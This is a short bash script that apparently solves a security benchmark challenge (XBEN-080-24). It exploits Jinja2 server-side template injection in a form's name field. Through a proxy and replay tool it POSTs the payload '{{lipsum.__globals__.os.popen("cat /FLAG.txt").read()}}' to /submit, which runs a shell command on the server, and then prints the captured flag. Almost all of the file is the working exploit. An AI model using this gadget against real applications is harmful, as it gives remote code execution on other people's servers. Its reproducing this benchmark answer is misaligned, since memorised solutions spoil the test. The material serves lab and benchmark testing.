#!/usr/bin/env bash
# XBEN-080-24 — Jinja2 SSTI in a form submission. Proxy-mode twin. /submit
# renders the name field as a template; the lipsum gadget runs cat /FLAG.txt.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben080p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/application"; BASE="$(req_of GET application)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/submit' \
  --set 'form.name={{lipsum.__globals__.os.popen("cat /FLAG.txt").read()}}' >/dev/null
print_flag
